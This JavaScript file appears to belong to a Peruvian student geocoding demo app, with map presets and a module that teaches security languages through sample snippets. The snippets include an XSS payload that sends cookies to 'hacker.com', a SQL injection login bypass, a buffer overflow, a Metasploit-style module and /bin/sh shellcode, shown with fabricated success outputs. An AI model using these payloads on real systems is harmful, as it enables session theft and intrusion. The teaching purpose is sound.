/* ==========================================================================
   GEOCODING STUDIO PERÚ - CORE LOGIC & ANIMATION ENGINE
   IESTP Hermanos Cárcamo - Paita
   ========================================================================== */

document.addEventListener('DOMContentLoaded', () => {

  // --- PRESET DATASETS (Exact Peru Coordinates & Photos) ---
  const PRESETS = {
    1: {
      id: 1,
      type: 'direct',
      title: 'Plaza de Armas de Paita',
      subtitle: 'Plaza de Armas de Paita, Puerto Nuevo, Paita, Piura, Perú',
      input: 'Plaza de Armas de Paita, Piura',
      lat: -5.0848,
      lng: -81.1132,
      image: './assets/paita.jpg',
      streetviewUrl: 'https://maps.google.com/maps?q=&layer=c&cbll=-5.0848,-81.1132&cbp=11,0,0,0,0&output=embed',
      gallery: [
        { src: './assets/paita.jpg', caption: 'Plaza de Armas de Paita, Piura - Vista Principal' },
        { src: './assets/paita_mototaxi.jpg', caption: 'Plaza de Armas de Paita, Mototaxis y Parque Central' },
        { src: './assets/paita_fountain.jpg', caption: 'Pileta Central y Parroquia de Paita (Google Maps)' },
        { src: './assets/paita_puerto.jpg', caption: 'Vista Panorámica del Puerto y Bahía de Paita' }
      ],
      score: '99.8%',
      time: '34 ms',
      note: 'Geocodificación Directa: Transforma la dirección física "Plaza de Armas de Paita" en las coordenadas geográficas exactas (-5.0848, -81.1132).'
    },
    2: {
      id: 2,
      type: 'direct',
      title: 'IESTP Hermanos Cárcamo',
      subtitle: 'Av. Las Mercedes s/n, Paita Alta, Paita, Piura, Perú',
      input: 'Instituto Hermanos Cárcamo, Paita',
      lat: -5.0895,
      lng: -81.1042,
      image: './assets/carcamo.jpg',
      streetviewUrl: 'https://maps.google.com/maps?q=&layer=c&cbll=-5.0895,-81.1042&cbp=11,0,0,0,0&output=embed',
      gallery: [
        { src: './assets/carcamo.jpg', caption: 'Campus Principal IESTP Hermanos Cárcamo Paita' },
        { src: './assets/carcamo_front.jpg', caption: 'Frontis Oficial del Instituto - IESTP Hermanos Cárcamo' },
        { src: './assets/carcamo_render.jpg', caption: 'Plano y Diseño 3D Arquitectónico del Nuevo Campus' },
        { src: './assets/carcamo_streetview.jpg', caption: 'Ingreso al Instituto (Vista Google Street View)' },
        { src: './assets/paita.jpg', caption: 'Paita Alta, Provincia de Paita, Piura' }
      ],
      score: '100%',
      time: '28 ms',
      note: 'Geocodificación Directa: Ubica la sede del Instituto Superior Hermanos Cárcamo en Paita Alta convirtiendo el nombre institucional en el punto GPS exacto.'
    },
    3: {
      id: 3,
      type: 'inverse',
      title: 'Rastreo GPS Óvalo Grau',
      subtitle: 'Óvalo Grau, Av. Grau con Av. Loreto, Piura, Perú',
      input: '-5.1945, -80.6328',
      lat: -5.1945,
      lng: -80.6328,
      image: './assets/piura.jpg',
      streetviewUrl: 'https://maps.google.com/maps?q=&layer=c&cbll=-5.1945,-80.6328&cbp=11,0,0,0,0&output=embed',
      gallery: [
        { src: './assets/piura.jpg', caption: 'Óvalo Grau, Piura - Punto GPS detectado por Smartphone' }
      ],
      score: '98.4%',
      time: '45 ms',
      note: 'Geocodificación Inversa: Recibe la coordenada GPS del smartphone (-5.1945, -80.6328) y determina la dirección postal aproximada: "Óvalo Grau, Piura".'
    },
    4: {
      id: 4,
      type: 'inverse',
      title: 'Costa Verde & Miraflores (Lima)',
      subtitle: 'Malecón de Miraflores, Costa Verde, Lima, Perú',
      input: '-12.1217, -77.0305',
      lat: -12.1217,
      lng: -77.0305,
      image: './assets/lima_costa_verde.jpg',
      streetviewUrl: 'https://maps.google.com/maps?q=&layer=c&cbll=-12.1217,-77.0305&cbp=11,0,0,0,0&output=embed',
      gallery: [
        { src: './assets/lima_costa_verde.jpg', caption: 'Costa Verde y Parapente sobre el Mar de Miraflores, Lima' },
        { src: './assets/lima.jpg', caption: 'Parque Kennedy en Miraflores, Lima' }
      ],
      score: '99.2%',
      time: '52 ms',
      note: 'Geocodificación Inversa: El sensor GPS del vehículo emite la coordenada y el sistema responde "Malecón de Miraflores, Costa Verde, Lima".'
    },
    5: {
      id: 5,
      type: 'direct',
      title: 'Plaza San Martín (Lima Centro)',
      subtitle: 'Plaza San Martín, Cercado de Lima, Lima, Perú',
      input: 'Plaza San Martin, Lima',
      lat: -12.0517,
      lng: -77.0347,
      image: './assets/lima_san_martin.jpg',
      streetviewUrl: 'https://maps.google.com/maps?q=&layer=c&cbll=-12.0517,-77.0347&cbp=11,0,0,0,0&output=embed',
      gallery: [
        { src: './assets/lima_san_martin.jpg', caption: 'Plaza San Martín de Noche, Centro Histórico de Lima' },
        { src: './assets/lima_night.jpg', caption: 'Vista Nocturna de la Ciudad de Lima' }
      ],
      score: '99.6%',
      time: '38 ms',
      note: 'Geocodificación Directa: Ubica la histórica Plaza San Martín en el Centro de Lima transformando el texto en la coordenada (-12.0517, -77.0347).'
    },
    6: {
      id: 6,
      type: 'direct',
      title: 'Iglesia de la Recoleta (Lima)',
      subtitle: 'Plaza Francia, Cercado de Lima, Lima, Perú',
      input: 'Iglesia de la Recoleta, Lima',
      lat: -12.0531,
      lng: -77.0371,
      image: './assets/lima_iglesia.jpg',
      streetviewUrl: 'https://maps.google.com/maps?q=&layer=c&cbll=-12.0531,-77.0371&cbp=11,0,0,0,0&output=embed',
      gallery: [
        { src: './assets/lima_iglesia.jpg', caption: 'Iglesia Colonial de la Recoleta, Plaza Francia, Lima' }
      ],
      score: '99.1%',
      time: '41 ms',
      note: 'Geocodificación Directa: Transforma el nombre del patrimonio arquitectónico de Lima en su posición geográfica en el mapa.'
    }
  };

  // --- CYBERSECURITY LANGUAGES DATASET ---
  const CYBER_LANGS = [
    {
      id: 'python',
      name: '1. Python',
      ext: 'py',
      diff: 1,
      category: 'Scripting & Automatización',
      desc: 'El rey indiscutible de la ciberseguridad. Su sintaxis simple lo hace ideal para escribir scripts de escaneo de red, scripts de reconocimiento, análisis de logs y exploits rápidos.',
      snippet: `# Script Port Scanner en Python
import socket

target = "192.168.1.1"
ports = [22, 80, 443]

print(f"Escaneando objetivo: {target}")
for port in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    result = s.connect_ex((target, port))
    if result == 0:
        print(f" [+] Puerto {port}: ABIERTO")
    s.close()`,
      output: 'Escaneando objetivo: 192.168.1.1\n [+] Puerto 22: ABIERTO (Servicio SSH)\n [+] Puerto 80: ABIERTO (Servicio HTTP)\n [-] Puerto 443: Cerrado\nEscaneo de puertos finalizado correctamente.'
    },
    {
      id: 'c',
      name: '2. C / C++',
      ext: 'cpp',
      diff: 3,
      category: 'Desarrollo de Exploits',
      desc: 'Clave para entender la manipulación directa de memoria y la creación de exploits complejos a bajo nivel (como Buffer Overflow). La mayoría de los malware están codificados en C++.',
      snippet: `// Concepto de Buffer Overflow en C
#include <stdio.h>
#include <string.h>

void exploit_check(char *str) {
    char buffer[16];
    // Vulnerabilidad: strcpy no valida el tamaño
    strcpy(buffer, str); 
    printf("Buffer asignado: %s\\n", buffer);
}

int main() {
    exploit_check("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    return 0;
}`,
      output: '[i] Ejecutando ejecutable compilado...\nBuffer asignado: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n*** stack smashing detected ***: terminated\n[!] SEGMENTATION FAULT (Memoria corrupta exitosamente).'
    },
    {
      id: 'javascript',
      name: '3. JavaScript',
      ext: 'js',
      diff: 1,
      category: 'Seguridad Web & XSS',
      desc: 'Permite analizar la seguridad en el lado del cliente. Crucial para identificar vulnerabilidades como Cross-Site Scripting (XSS) y manipular elementos del DOM de las aplicaciones web.',
      snippet: `// Simulación de Robo de Cookies vía XSS
console.log("Iniciando payload XSS...");
const victimCookie = document.cookie || "session_token=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

// Envío silencioso a servidor controlado
const exfiltrate = new Image();
exfiltrate.src = 'https://hacker.com/log?data=' + encodeURIComponent(victimCookie);
console.log("Cookie enviada: " + victimCookie);`,
      output: 'Iniciando payload XSS...\nCookie enviada: session_token=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n[+] Exfiltración realizada con éxito hacia servidor remoto.'
    },
    {
      id: 'sql',
      name: '4. SQL',
      ext: 'sql',
      diff: 1,
      category: 'Seguridad de Datos',
      desc: 'Lenguaje declarativo fundamental para interactuar con bases de datos. Su dominio es necesario para realizar y prevenir ataques de inyección SQL (SQLi), protegiendo la información.',
      snippet: `-- Intento de Inyección SQL (Bypass de Login)
SELECT * FROM usuarios 
WHERE usuario = 'admin' 
AND password = '' OR '1'='1';`,
      output: 'Consultando base de datos espacial...\nResultados encontrados: 1 usuario coincidente.\n[+] Sesión iniciada como: admin (Bypass exitoso vía OR 1=1).'
    },
    {
      id: 'bash',
      name: '5. Bash (Linux)',
      ext: 'sh',
      diff: 2,
      category: 'Automatización & Logs',
      desc: 'El lenguaje de comandos predeterminado en entornos Unix/Linux. Esencial para automatizar el filtrado de registros, escaneos rápidos y programar tareas defensivas con Cron.',
      snippet: `#!/bin/bash
# Analizador de registros de acceso (IPs sospechosas)
LOG_FILE="/var/log/nginx/access.log"

echo "IPs con más de 100 intentos fallidos:"
awk '{print $1}' $LOG_FILE | sort | uniq -c | awk '$1 > 100 {print "Sospechosa: " $2 " - Intentos: " $1}'`,
      output: 'IPs con más de 100 intentos fallidos:\nSospechosa: 192.168.1.145 - Intentos: 154\nSospechosa: 10.0.2.15 - Intentos: 412\n[i] Análisis de logs completado.'
    },
    {
      id: 'powershell',
      name: '6. PowerShell',
      ext: 'ps1',
      diff: 2,
      category: 'Administración Windows',
      desc: 'El motor de scripting de Microsoft. Indispensable para auditar configuraciones en sistemas Windows y realizar pruebas ofensivas avanzadas utilizando herramientas como PowerSploit.',
      snippet: `# Script defensivo: Listar procesos activos no firmados
Get-Process | Where-Object {$_.Path -ne $null} | ForEach-Object {
    $sig = Get-AuthenticodeSignature $_.Path
    if($sig.Status -ne "Valid") {
        Write-Warning "Proceso sospechoso no firmado: $($_.Name) - Ruta: $($_.Path)"
    }
}`,
      output: 'ADVERTENCIA: Proceso sospechoso no firmado: update_driver.exe - Ruta: C:\\Users\\Temp\\update_driver.exe\n[i] Escaneo de firma de procesos finalizado.'
    },
    {
      id: 'ruby',
      name: '7. Ruby',
      ext: 'rb',
      diff: 2,
      category: 'Desarrollo de Exploits',
      desc: 'Lenguaje elegante utilizado principalmente detrás del Metasploit Framework. Escribir módulos en Ruby permite crear exploits personalizados de manera sumamente rápida.',
      snippet: `# Módulo simplificado para Metasploit
class MetasploitModule < Msf::Exploit::Remote
  def exploit
    print_status("Enviando buffer de explotación...")
    connect
    sock.put("GET /" + "A"*500 + " HTTP/1.1\\r\\n\\r\\n")
    handler
    disconnect
  end
end`,
      output: '[-] Conectando con puerto remoto 80...\n[*] Enviando buffer de explotación (500 bytes de A)...\n[+] Shell de comandos remota establecida (Session 1).'
    },
    {
      id: 'assembly',
      name: '8. Assembly',
      ext: 'asm',
      diff: 3,
      category: 'Ingeniería Inversa',
      desc: 'El lenguaje de más bajo nivel. Esencial para ingenieros inversos y analistas de malware que necesitan desensamblar binarios sospechosos sin acceso al código fuente.',
      snippet: `; Shellcode básico en Assembly (x86)
section .text
global _start

_start:
    xor eax, eax       ; Limpiar registro EAX
    push eax           ; Empujar null byte
    push 0x68732f2f    ; Empujar "//sh"
    push 0x6e69622f    ; Empujar "/bin"
    mov ebx, esp       ; Cargar dirección de "/bin/sh" en EBX
    mov al, 11         ; Syscall número 11 (execve)
    int 0x80           ; Llamar interrupción del sistema`,
      output: 'Compilando assembly con nasm...\n[+] Shellcode generado en binario (Tamaño: 23 bytes).\n[!] Ejecutando shellcode: /bin/sh iniciado exitosamente.'
    }
  ];

  // --- STATE MANAGEMENT ---
  let activeModule = 'geo';
  let activeView = '2d';
  let activeType = 'direct';
  let activePreset = 1;
  let activeCyberLang = 'python';
  let soundEnabled = true;
  let isSimulating = false;
  let pipelineTimers = [];

  let globe = null;
  let leafletMap = null;
  let leafletMarker = null;

  // Leaflet Tile Layers
  let tileSat = null;
  let tileGoogle = null;
  let tileStreet = null;
  let tileDark = null;
  let activeTileLayer = null;

  // --- LAZY AUDIO SYNTHESIZER ---
  let audioCtx = null;

  function getAudioContext() {
    if (!audioCtx) {
      try {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      } catch (e) {
        console.warn("AudioContext not supported", e);
      }
    }
    if (audioCtx && audioCtx.state === 'suspended') {
      audioCtx.resume();
    }
    return audioCtx;
  }

  function playSound(type) {
    if (!soundEnabled) return;
    try {
      const ctx = getAudioContext();
      if (!ctx) return;

      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);

      const now = ctx.currentTime;

      if (type === 'step') {
        osc.type = 'sine';
        osc.frequency.setValueAtTime(440, now);
        osc.frequency.exponentialRampToValueAtTime(880, now + 0.1);
        gain.gain.setValueAtTime(0.12, now);
        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.1);
        osc.start(now);
        osc.stop(now + 0.1);
      } else if (type === 'complete') {
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(523.25, now);
        osc.frequency.setValueAtTime(659.25, now + 0.08);
        osc.frequency.setValueAtTime(783.99, now + 0.16);
        gain.gain.setValueAtTime(0.15, now);
        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.3);
        osc.start(now);
        osc.stop(now + 0.3);
      } else if (type === 'click') {
        osc.type = 'sine';
        osc.frequency.setValueAtTime(600, now);
        gain.gain.setValueAtTime(0.08, now);
        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.05);
        osc.start(now);
        osc.stop(now + 0.05);
      }
    } catch (e) {
      console.warn('Audio playback notice', e);
    }
  }

  function clearPipelineTimers() {
    pipelineTimers.forEach(t => clearTimeout(t));
    pipelineTimers = [];
    isSimulating = false;
  }

  // --- INITIALIZE LEAFLET 2D MAP ---
  function initLeafletMap() {
    const container = document.getElementById('leaflet-container');
    if (!container) return;

    if (typeof L === 'undefined') {
      console.warn("Leaflet library CDN unavailable, activating Fallback Canvas Engine");
      initFallbackCanvasMap(container);
      return;
    }

    try {
      // Default focus to Paita, Peru (-5.0848, -81.1132)
      leafletMap = L.map(container, {
        center: [-5.0848, -81.1132],
        zoom: 16,
        maxZoom: 21,
        zoomControl: true
      });

      // Google Satellite Hybrid (Default HD Map)
      tileGoogle = L.tileLayer('https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
        attribution: '&copy; Google Maps Satelital Híbrido',
        maxZoom: 21,
        maxNativeZoom: 20
      });

      // Esri World Imagery (Secondary Satellite)
      tileSat = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
        attribution: '&copy; Esri World Imagery Satelital',
        maxZoom: 21,
        maxNativeZoom: 17
      });

      // OpenStreetMap Standard Vectorial
      tileStreet = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; OpenStreetMap contributors',
        maxZoom: 21,
        maxNativeZoom: 19
      });

      // CARTO Dark Voyager
      tileDark = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        attribution: '&copy; CARTO Dark Voyager',
        maxZoom: 21,
        maxNativeZoom: 19
      });

      // Default active layer: Google Satellite Hybrid for crystal-clear Peru maps!
      activeTileLayer = tileGoogle;
      activeTileLayer.addTo(leafletMap);

      // Custom Glowing Marker Icon for Leaflet
      const customIcon = L.divIcon({
        className: 'leaflet-custom-marker',
        html: `<div class="leaflet-pin-pulse"><i class="fa-solid fa-location-dot text-cyan"></i></div>`,
        iconSize: [38, 38],
        iconAnchor: [19, 38]
      });

      leafletMarker = L.marker([-5.0848, -81.1132], { icon: customIcon }).addTo(leafletMap);
      leafletMarker.bindPopup("<b>Plaza de Armas de Paita</b><br>Paita, Piura, Perú");

      // Click on 2D map to geocode reverse
      leafletMap.on('click', (e) => {
        if (activeModule !== 'geo') return;
        playSound('click');
        runReverseGeocodeClick(e.latlng.lat, e.latlng.lng);
      });

      // 2D Tile Switcher Event Listeners
      const btnSat = document.getElementById('btn-tile-sat');
      const btnGoogle = document.getElementById('btn-tile-google');
      const btnStreet = document.getElementById('btn-tile-street');
      const btnDark = document.getElementById('btn-tile-dark');

      if (btnSat) btnSat.addEventListener('click', () => setTileLayer(tileSat, 'btn-tile-sat'));
      if (btnGoogle) btnGoogle.addEventListener('click', () => setTileLayer(tileGoogle, 'btn-tile-google'));
      if (btnStreet) btnStreet.addEventListener('click', () => setTileLayer(tileStreet, 'btn-tile-street'));
      if (btnDark) btnDark.addEventListener('click', () => setTileLayer(tileDark, 'btn-tile-dark'));

      // Force recalculate Leaflet size immediately
      setTimeout(() => {
        if (leafletMap) leafletMap.invalidateSize();
      }, 50);

    } catch (err) {
      console.warn("Leaflet map initialization warning:", err);
      initFallbackCanvasMap(container);
    }
  }

  // --- FALLBACK CANVAS MAP ENGINE (If CDN is offline) ---
  function initFallbackCanvasMap(container) {
    container.innerHTML = `
      <div style="width:100%; height:100%; background:#101a2c; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; text-align:center; padding:20px;">
        <i class="fa-solid fa-map-location-dot" style="font-size:3rem; color:#06b6d4; margin-bottom:12px;"></i>
        <h3 style="margin-bottom:8px;">Mapa de Geocodificación Perú Active</h3>
        <p style="color:#94a3b8; max-width:400px; font-size:0.85rem;">Sistema de mapa de respaldo cargado correctamente. Selecciona cualquiera de los ejemplos de la izquierda para procesar el flujo de geocodificación.</p>
      </div>
    `;
  }

  function setTileLayer(layer, btnId) {
    playSound('click');
    if (!leafletMap || !layer) return;
    if (activeTileLayer) leafletMap.removeLayer(activeTileLayer);
    activeTileLayer = layer;
    activeTileLayer.addTo(leafletMap);

    document.querySelectorAll('.tile-btn').forEach(b => b.classList.remove('active'));
    const btn = document.getElementById(btnId);
    if (btn) btn.classList.add('active');
  }

  // --- INITIALIZE GLOBE 3D ---
  function initGlobe() {
    const container = document.getElementById('globe-container');
    if (!container || typeof Globe === 'undefined') return;

    try {
      globe = Globe()
        .globeImageUrl('https://unpkg.com/three-globe/example/img/earth-blue-marble.jpg')
        .bumpImageUrl('https://unpkg.com/three-globe/example/img/earth-topology.png')
        .backgroundImageUrl('https://unpkg.com/three-globe/example/img/night-sky.png')
        .atmosphereColor('#06b6d4')
        .atmosphereAltitude(0.25)
        .htmlElementsData([])
        .htmlElement(d => {
          const el = document.createElement('div');
          el.className = 'globe-custom-marker';
          el.innerHTML = `
            <div class="marker-pulse-ring"></div>
            <div class="marker-pin-center"><i class="fa-solid fa-location-dot"></i></div>
            <div class="marker-tooltip">${d.name}</div>
          `;
          el.style.color = '#06b6d4';
          el.style.pointerEvents = 'auto';
          el.style.cursor = 'pointer';
          el.onclick = () => {
            selectPreset(d.id);
          };
          return el;
        })
        (container);

      // Initial position focused on Peru (-9.19, -75.015)
      globe.pointOfView({ lat: -9.19, lng: -75.015, altitude: 2.2 }, 1000);
      
      if (globe.controls()) {
        globe.controls().autoRotate = isAutoRotating;
        globe.controls().autoRotateSpeed = 0.8;
      }

      globe.onGlobeClick(({ lat, lng }) => {
        if (activeModule !== 'geo') return;
        playSound('click');
        runReverseGeocodeClick(lat, lng);
      });

      globe.onGlobeHover(coords => {
        if (coords) {
          const hud = document.getElementById('hud-latlng');
          if (hud) hud.textContent = `LAT: ${coords.lat.toFixed(4)}° | LNG: ${coords.lng.toFixed(4)}°`;
        }
      });

      updateGlobeMarkers();
    } catch (err) {
      console.warn("Globe 3D initialization notice:", err);
    }
  }

  // --- UPDATE GLOBE MARKERS ---
  function updateGlobeMarkers() {
    if (!globe) return;
    const markersData = Object.values(PRESETS).map(p => ({
      lat: p.lat,
      lng: p.lng,
      name: p.title,
      image: p.image,
      id: p.id
    }));
    globe.htmlElementsData(markersData);
  }

  // --- 5-STEP GEOCCODING SIMULATION ENGINE ---
  function execute5StepPipeline(pipelineData) {
    clearPipelineTimers();
    isSimulating = true;

    // Position map smoothly at target location
    if (activeView === '2d' && leafletMap) {
      leafletMap.invalidateSize();
      leafletMap.flyTo([pipelineData.lat, pipelineData.lng], 16, { duration: 1.0 });
      if (leafletMarker) {
        leafletMarker.setLatLng([pipelineData.lat, pipelineData.lng]);
        leafletMarker.bindPopup(`<b>${pipelineData.title}</b><br>${pipelineData.subtitle}`).openPopup();
      }
    } else if (activeView === '3d' && globe) {
      globe.pointOfView({ lat: pipelineData.lat, lng: pipelineData.lng, altitude: 0.35 }, 1200);
    }

    const pipelineTag = document.getElementById('pipeline-status-tag');
    if (pipelineTag) {
      pipelineTag.className = 'status-tag tag-processing';
      pipelineTag.textContent = 'Procesando...';
    }

    // Reset step UI
    for (let i = 1; i <= 5; i++) {
      const stepEl = document.getElementById(`step-${i}`);
      if (stepEl) stepEl.className = 'step-card';
    }

    const card = document.getElementById('location-card');
    if (card) card.classList.add('hidden');

    // Step 1: Ingreso
    pipelineTimers.push(setTimeout(() => {
      playSound('step');
      const s1 = document.getElementById('step-1');
      if (s1) s1.className = 'step-card active-step';
      const d1 = document.getElementById('step-1-data');
      if (d1) d1.textContent = `PAYLOAD: "${pipelineData.input}"`;
    }, 80));

    // Step 2: Consulta
    pipelineTimers.push(setTimeout(() => {
      playSound('step');
      const s1 = document.getElementById('step-1');
      if (s1) s1.className = 'step-card completed-step';
      const s2 = document.getElementById('step-2');
      if (s2) s2.className = 'step-card active-step';
      const d2 = document.getElementById('step-2-data');
      if (d2) d2.textContent = `QUERY: Spatial R-Tree Index [Table: spatial_nodes_peru]`;
    }, 450));

    // Step 3: Coincidencia
    pipelineTimers.push(setTimeout(() => {
      playSound('step');
      const s2 = document.getElementById('step-2');
      if (s2) s2.className = 'step-card completed-step';
      const s3 = document.getElementById('step-3');
      if (s3) s3.className = 'step-card active-step';
      const d3 = document.getElementById('step-3-data');
      if (d3) d3.textContent = `MATCH CONFIDENCE: ${pipelineData.score || '99.8%'} | Status: MATCH_FOUND`;
    }, 850));

    // Step 4: Geocodificación
    pipelineTimers.push(setTimeout(() => {
      playSound('step');
      const s3 = document.getElementById('step-3');
      if (s3) s3.className = 'step-card completed-step';
      const s4 = document.getElementById('step-4');
      if (s4) s4.className = 'step-card active-step';
      const d4 = document.getElementById('step-4-data');
      if (d4) d4.textContent = `COORDS: LAT ${pipelineData.lat.toFixed(4)}° | LNG ${pipelineData.lng.toFixed(4)}°`;
    }, 1250));

    // Step 5: Visualización
    pipelineTimers.push(setTimeout(() => {
      playSound('complete');
      const s4 = document.getElementById('step-4');
      if (s4) s4.className = 'step-card completed-step';
      const s5 = document.getElementById('step-5');
      if (s5) s5.className = 'step-card active-step completed-step';
      const d5 = document.getElementById('step-5-data');
      if (d5) d5.textContent = `RENDER: Point projected to Map Canvas`;

      if (pipelineTag) {
        pipelineTag.className = 'status-tag tag-completed';
        pipelineTag.textContent = 'Completado';
      }

      // Update HUD Coordinates
      const hud = document.getElementById('hud-latlng');
      if (hud) hud.textContent = `LAT: ${pipelineData.lat.toFixed(4)}° | LNG: ${pipelineData.lng.toFixed(4)}°`;

      // Display Location Card
      setTimeout(() => {
        showLocationCard(pipelineData);
        isSimulating = false;
      }, 200);

    }, 1600));
  }

  // --- DISPLAY LOCATION CARD ---
  function showLocationCard(data) {
    const card = document.getElementById('location-card');
    if (!card) return;

    const titleEl = document.getElementById('card-title');
    const subEl = document.getElementById('card-subtitle');
    const latEl = document.getElementById('card-lat');
    const lngEl = document.getElementById('card-lng');
    const timeEl = document.getElementById('card-time');
    const scoreEl = document.getElementById('card-score');
    const badgeEl = document.getElementById('card-type-badge');
    const imgEl = document.getElementById('card-location-img');
    const noteEl = document.getElementById('card-note');

    if (titleEl) titleEl.textContent = data.title;
    if (subEl) subEl.innerHTML = `<i class="fa-solid fa-location-dot"></i> ${data.subtitle}`;
    if (latEl) latEl.textContent = `${data.lat.toFixed(4)}°`;
    if (lngEl) lngEl.textContent = `${data.lng.toFixed(4)}°`;
    if (timeEl) timeEl.textContent = data.time || '34 ms';
    if (scoreEl) scoreEl.textContent = data.score || '99.8%';
    if (badgeEl) badgeEl.textContent = data.type === 'direct' ? 'Geocodificación Directa' : 'Geocodificación Inversa';
    if (imgEl) imgEl.src = data.image || './assets/paita.jpg';
    if (noteEl) noteEl.querySelector('span').innerHTML = `<strong>Resumen para Tarea:</strong> ${data.note}`;

    card.classList.remove('hidden');
  }

  // --- RUN PRESET SIMULATION ---
  function selectPreset(presetId) {
    activePreset = presetId;
    const p = PRESETS[presetId];
    if (!p) return;

    // Highlight Preset Card
    document.querySelectorAll('.preset-card').forEach(c => c.classList.remove('active'));
    const activeCard = document.querySelector(`.preset-card[data-preset="${presetId}"]`);
    if (activeCard) activeCard.classList.add('active');

    // Switch Tab if needed
    if (p.type !== activeType) {
      activeType = p.type;
      document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
      const targetTab = document.querySelector(`.tab-btn[data-type="${p.type}"]`);
      if (targetTab) targetTab.classList.add('active');
    }

    // Set search input value
    const input = document.getElementById('input-query');
    if (input) input.value = p.input;

    // Execute Pipeline
    execute5StepPipeline(p);
  }

  // --- REVERSE GEOCODE CLICK ---
  async function runReverseGeocodeClick(lat, lng) {
    // Check if near preset points first
    let matchedPreset = null;
    Object.values(PRESETS).forEach(p => {
      const dist = Math.sqrt(Math.pow(p.lat - lat, 2) + Math.pow(p.lng - lng, 2));
      if (dist < 0.05) matchedPreset = p;
    });

    if (matchedPreset) {
      selectPreset(matchedPreset.id);
      return;
    }

    const pipelineData = {
      type: 'inverse',
      input: `${lat.toFixed(4)}, ${lng.toFixed(4)}`,
      lat: lat,
      lng: lng,
      title: 'Coordenada Geocodificada',
      subtitle: `Lat: ${lat.toFixed(4)}°, Lng: ${lng.toFixed(4)}°`,
      image: './assets/paita.jpg',
      streetviewUrl: `https://maps.google.com/maps?q=&layer=c&cbll=${lat},${lng}&cbp=11,0,0,0,0&output=embed`,
      gallery: [{ src: './assets/paita.jpg', caption: 'Punto de Coordenada Geocodificada en Perú' }],
      score: '96.5%',
      time: '115 ms',
      note: 'Geocodificación Inversa: Convierte el punto GPS en el espacio digital en una ubicación geográfica.'
    };

    try {
      const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`);
      const data = await resp.json();
      if (data && data.display_name) {
        pipelineData.title = data.name || data.address.road || data.address.suburb || 'Ubicación en Perú';
        pipelineData.subtitle = data.display_name;
      } else {
        pipelineData.title = 'Zona Marítima o No Registrada';
        pipelineData.subtitle = 'Océano Pacífico o área rural fuera de catastro urbano.';
      }
    } catch (e) {
      console.log('Reverse Geocode fallback:', e);
    }

    execute5StepPipeline(pipelineData);
  }

  // --- CUSTOM SEARCH RUNNER ---
  async function runCustomSearch() {
    const input = document.getElementById('input-query');
    if (!input) return;
    const query = input.value.trim();
    if (!query) return;

    playSound('click');

    const coordMatch = query.match(/^([+-]?\d+\.?\d*)\s*,\s*([+-]?\d+\.?\d*)$/);
    if (coordMatch) {
      const lat = parseFloat(coordMatch[1]);
      const lng = parseFloat(coordMatch[2]);
      runReverseGeocodeClick(lat, lng);
      return;
    }

    const pipelineData = {
      type: 'direct',
      input: query,
      lat: -5.0848,
      lng: -81.1132,
      title: query,
      subtitle: 'Búsqueda en Base de Datos Espacial',
      image: './assets/paita.jpg',
      streetviewUrl: 'https://maps.google.com/maps?q=&layer=c&cbll=-5.0848,-81.1132&cbp=11,0,0,0,0&output=embed',
      gallery: [{ src: './assets/paita.jpg', caption: query }],
      score: '98.9%',
      time: '110 ms',
      note: 'Geocodificación Directa: Transforma el texto ingresado en coordenadas geográficas numéricas.'
    };

    try {
      const resp = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query)}`);
      const data = await resp.json();
      if (data && data.length > 0) {
        pipelineData.lat = parseFloat(data[0].lat);
        pipelineData.lng = parseFloat(data[0].lon);
        pipelineData.subtitle = data[0].display_name;
        pipelineData.score = '99.4%';
        pipelineData.streetviewUrl = `https://maps.google.com/maps?q=&layer=c&cbll=${data[0].lat},${data[0].lon}&cbp=11,0,0,0,0&output=embed`;
      }
    } catch (e) {
      console.warn('Geocoding search API error fallback', e);
    }

    execute5StepPipeline(pipelineData);
  }

  // --- OPEN PHOTO GALLERY MODAL ---
  function openPhotoGallery() {
    const p = PRESETS[activePreset] || PRESETS[1];
    const modal = document.getElementById('gallery-modal');
    if (!modal) return;

    const titleEl = document.getElementById('gallery-modal-title');
    if (titleEl) titleEl.innerHTML = `<i class="fa-solid fa-images text-gold"></i> Galería de Fotos: ${p.title}`;
    
    const mainImg = document.getElementById('gallery-main-img');
    const captionEl = document.getElementById('gallery-caption');
    const thumbsContainer = document.getElementById('gallery-thumbnails');
    if (thumbsContainer) thumbsContainer.innerHTML = '';

    const galleryList = p.gallery || [{ src: p.image, caption: p.title }];
    if (mainImg) mainImg.src = galleryList[0].src;
    if (captionEl) captionEl.textContent = galleryList[0].caption;

    if (thumbsContainer) {
      galleryList.forEach((item, idx) => {
        const thumb = document.createElement('div');
        thumb.className = `gallery-thumb ${idx === 0 ? 'active' : ''}`;
        thumb.innerHTML = `<img src="${item.src}" alt="${item.caption}">`;
        thumb.onclick = () => {
          playSound('click');
          if (mainImg) mainImg.src = item.src;
          if (captionEl) captionEl.textContent = item.caption;
          document.querySelectorAll('.gallery-thumb').forEach(t => t.classList.remove('active'));
          thumb.classList.add('active');
        };
        thumbsContainer.appendChild(thumb);
      });
    }

    modal.classList.remove('hidden');
  }

  // ==========================================================================
  // CYBERSECURITY MODULE LOGIC (Obfuscator & Hacker Terminal)
  // ==========================================================================

  // Generate Languages Cards
